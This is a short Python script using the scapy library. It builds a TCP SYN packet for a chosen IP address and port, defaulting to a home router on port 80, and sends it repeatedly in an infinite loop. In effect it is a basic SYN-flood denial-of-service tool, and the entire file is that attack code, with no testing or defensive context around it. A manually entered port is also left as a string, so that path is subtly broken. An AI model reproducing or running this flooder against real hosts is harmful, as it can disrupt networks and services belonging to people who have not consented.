import scapy.all as scapy


def build_packet(ip, port):
    ip_layer = scapy.IP(dst=ip)
    tcp_layer = scapy.TCP(dport=port, flags="S", seq=1000)
    packet = ip_layer/tcp_layer
    return packet


def main():
    #my_router:
    router_ip = "192.168.1.1"
    port = 80

    answer = input("wanna enter manully the data? [Y/N]")
    answer = answer.lower()
    if(answer == "y"):
        router_ip = input("enter ip")
        port = input("enter port")

    packet = build_packet(router_ip, port)

    while(True):
        scapy.send(packet)

if __name__ == "__main__":
    main()

























